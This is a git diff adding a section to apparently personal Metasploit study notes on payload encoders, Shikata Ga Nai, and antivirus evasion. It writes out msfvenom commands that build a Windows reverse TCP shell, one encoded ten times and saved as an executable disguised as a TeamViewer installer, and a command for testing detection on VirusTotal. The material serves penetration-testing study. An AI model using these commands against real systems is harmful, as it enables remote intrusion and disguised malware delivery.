@@ -208,3 +208,32 @@ To access shell use **shell** command.
 **Channel 1** has been created, and we are automatically placed into the CLI for this machine. The channel here represents the connection between our device and the target host, which has been established in a reverse TCP connection (from the target host to us) using a Meterpreter Stager and Stage.
 ## Payload Types
 ![image](https://github.com/user-attachments/assets/593bb485-7e62-499b-99f4-205fee825ce5)
+
+# Encoders
+- **Encoders** help make payloads compatible with different architectures (e.g., x64, x86, sparc, ppc, mips) and assist in antivirus evasion.
+- They remove bad characters from payloads and can encode payloads in different formats for AV evasion, though their effectiveness for AV evasion has diminished.
+
+## Shikata Ga Nai (SGN)
+- One of the most widely used encoders, known for its ability to evade detection, though it's no longer as undetectable as before.
+- **SGN** means "It cannot be helped".
+
+## Payload Encoding Evolution
+- **Pre-2015**: Used **msfpayload** and **msfencode** to generate and encode payloads.
+- **Post-2015**: Both tools were combined into **msfvenom** for payload generation and encoding.
+
+## Example: SGN Encoding with msfvenom
+Generates encoded payloads:
+```
+ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
+```
+
+## AV Evasion and Iterations
+Encoding payloads multiple times with SGN increases the size but doesn't fully evade modern antivirus detection.
+```bash
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -f exe -i 10 -o ./TeamViewerInstall.exe
+```
+
+Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. Register for free and get api key.
+```
+msf-virustotal -k <API key> -f TeamViewerInstall.exe
+```
